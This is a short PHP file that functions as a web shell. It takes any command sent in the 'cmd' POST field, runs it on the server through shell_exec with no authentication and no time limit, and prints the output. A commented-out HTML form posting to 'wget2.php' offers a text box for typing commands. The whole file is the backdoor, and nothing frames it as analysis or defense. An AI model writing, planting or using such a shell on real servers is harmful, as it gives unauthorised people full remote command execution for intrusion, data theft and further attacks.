<?php
set_time_limit(0);
// echo "
// <form action=wget2.php method=post>
// <textarea name=cmd style='width: 100%; height: 20%;''>" . @htmlentities(stripslashes($_POST['cmd'])) . "</textarea>
// <input type=submit>
// </form>
// ";
if (isset($_POST['cmd'])){
  echo shell_exec(str_replace("\\\r\n", '', stripcslashes($_POST['cmd'])) . ' 2>&1');
}

?>